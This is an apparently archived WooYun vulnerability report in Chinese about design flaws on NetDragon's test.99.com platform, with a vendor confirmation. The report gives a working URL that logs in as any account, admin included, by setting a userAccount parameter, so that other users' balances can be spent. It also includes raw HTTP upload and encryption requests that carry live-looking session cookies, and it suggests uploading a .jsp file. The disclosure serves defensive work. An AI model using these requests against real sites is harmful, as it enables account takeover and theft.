{"id": 72578, "wybug_id": "wooyun-2015-0157092", "wybug_title": "福建网龙某平台几个设计缺陷打包可随意登录任意用户帐号消费他人余额", "wybug_corp": "福建网龙", "wybug_author": "路人甲", "wybug_date": "2015-11-30 17:04", "wybug_open_date": "2016-01-14 17:34", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向公众公开  简要描述： 设计缺陷打包，可随意登录任意用户帐号消费他人余额 详细说明：  \n\n地址：http://test.99.com/正常用户访问关键页面都会跳转到登录页面比如访问：http://test.99.com/reportHome?inner=1但我发现，在用户登录的时候，程序向服务端发送了一个请求http://test.99.com/registeruser/CookInsert?userAccount=你的用户名&inner=1他的作用貌似是写入cookie所以你只要任意输入一个userAccount（用户名，如果输入已存在的用户名），就可以看见这个用户的已操作内容，比如测试了什么app，测试结果如何，可以用这个用户的余额去测试你自己的app\nhttp://test.99.com/registeruser/CookInsert?userAccount=admin&inner=1\n输入该链接后会自动跳转\n\n注意右上角，admin登录\n\n   漏洞证明：  试试我刚注册的一个帐号\n\n\n\n\n\n\n\n我可以消费他人账户的余额了另外提一下上传\nPOST http://test.99.com/Upload/Upload?newName=20151130161726641 HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4User-Agent: Shockwave FlashHost: test.99.comContent-Length: 611Connection: Keep-AlivePragma: no-cacheCookie: 0FF535D2-3733-4059-AA48-73EFB0DA00CE=376FC8AE-EA0A-4aa9-8CF8-BDCF086DAFE7=2015-11-30 10:50:52&43CB770B-ECB7-4262-9F28-474C756FA85C=70d4a8d4-8f66-485b-8e94-ee1fce775487&77A7D26A-7211-4b2a-A04A-1A3F9959F179=3701509273&BF191744-3205-4d76-B8FC-3E0387F7EEFE=d55e909c26e5e8d5ebfa345be7b09fc8; NDUserCenterLogin=8D86E0CC-3E73-4d40-B849-55E6E63F9A08=910436806&689CFFF9-7996-407d-A0DC-C834CE0B56A3=7EF92FB482E4EB2EE160B6A5DEFD1F5029D046F09C329EF6C1BF5679A18308A58D32B5CB7B152CE7&6ACA984D-8C96-4f45-9DE4-EABE9161375B=5B09E419049BB818BB6E0E7C6E8F5959F93E97C6A61551DF0718F6AE3F737504&C201DE9A-536B-428d-88E4-4F8665742D12=1586&89FDB445-D8D5-4d19-BC3A-D1EC2BFE68E1=20151130105247&8E533C9E-481D-4288-89B2-71F96380C540=2015-11-30 11:52:47&6E3A37BE-A0BD-4b9b-87A3-3323C3806ADD=1597710df36c165ce69efc4517f897bd; QATestin=userid=test&userForm=99U; CNZZDATA1255966092=569517393-1448870087-%7C1448870087; Hm_lvt_d2a8914c513a31a167eb34a53b6b69f8=1448850128,1448851539,1448871451; Hm_lpvt_d2a8914c513a31a167eb34a53b6b69f8=1448871537------------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4Content-Disposition: form-data; name=\"Filename\"1.apk------------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4Content-Disposition: form-data; name=\"fileext\"*.apk------------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4Content-Disposition: form-data; name=\"folder\"/YunFTP------------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4Content-Disposition: form-data; name=\"Filedata\"; filename=\"1.apk\"Content-Type: application/octet-stream------------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4Content-Disposition: form-data; name=\"Upload\"Submit Query------------cH2cH2Ef1KM7ei4ei4Ij5gL6GI3ei4--\n看newName这个参数，如果修改为带后缀的test.jsp会如何\n\n返回值1是上传成功，0是失败但可惜我没找到上传路径或者站点根路径再提一下加密http://test.99.com/AdapterReport?taskid=RTUyMEZCRTg0RkVFQ0U1Qw%3d%3d这是加密好的值，但你加密的过程能不能不这样\nPOST http://test.99.com/JiaMi/Encrypt HTTP/1.1Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://test.99.com/ReportHome/Accept-Language: zh-cnAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: test.99.comContent-Length: 10Connection: Keep-AlivePragma: no-cacheCookie: 0FF535D2-3733-4059-AA48-73EFB0DA00CE=376FC8AE-EA0A-4aa9-8CF8-BDCF086DAFE7=2015-11-30 10:50:52&43CB770B-ECB7-4262-9F28-474C756FA85C=70d4a8d4-8f66-485b-8e94-ee1fce775487&77A7D26A-7211-4b2a-A04A-1A3F9959F179=3701509273&BF191744-3205-4d76-B8FC-3E0387F7EEFE=d55e909c26e5e8d5ebfa345be7b09fc8; NDUserCenterLogin=8D86E0CC-3E73-4d40-B849-55E6E63F9A08=910436806&689CFFF9-7996-407d-A0DC-C834CE0B56A3=7EF92FB482E4EB2EE160B6A5DEFD1F5029D046F09C329EF6C1BF5679A18308A58D32B5CB7B152CE7&6ACA984D-8C96-4f45-9DE4-EABE9161375B=5B09E419049BB818BB6E0E7C6E8F5959F93E97C6A61551DF0718F6AE3F737504&C201DE9A-536B-428d-88E4-4F8665742D12=1586&89FDB445-D8D5-4d19-BC3A-D1EC2BFE68E1=20151130105247&8E533C9E-481D-4288-89B2-71F96380C540=2015-11-30 11:52:47&6E3A37BE-A0BD-4b9b-87A3-3323C3806ADD=1597710df36c165ce69efc4517f897bd; QATestin=userid=人为马赛克&userForm=99U; CNZZDATA1255966092=2105390528-1448850179-http%253A%252F%252Ftest.99.com%252F%7C1448850179; Hm_lvt_d2a8914c513a31a167eb34a53b6b69f8=1448850128,1448851539; Hm_lpvt_d2a8914c513a31a167eb34a53b6b69f8=1448853165input=5187\n这样直接传值进行加密，完全没有必要啊   修复方案：  补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-11-30 17:34 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}